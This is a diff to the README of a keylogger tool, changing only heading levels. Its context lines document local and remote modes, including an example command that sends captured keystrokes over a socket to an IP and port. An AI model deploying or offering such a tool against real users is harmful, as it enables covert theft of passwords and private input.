@@ -14,7 +14,7 @@ This program propose 2 type of keylogger
 
 ## Parameters
 
-## [REQUIERED] Please, choose one of them
+### [REQUIERED] Please, choose one of them
 
         -l | --local : local keylogger, store data into file on this computer, require 1 argument (destination file)
                 Example : ./bin/main.exe -l D:\file.txt
@@ -22,7 +22,7 @@ This program propose 2 type of keylogger
         -r | --remote : remote keylogger, send data via socket, require 2 arguments (ip, port)
                 Example : ./bin/main.exe -r 192.168.1.16 7777
 
-## [OPTIONAL]
+### [OPTIONAL]
 
         -c | --no_click : don't store click keys (based on ascii)
                 Example : ./bin/main.exe ... -c
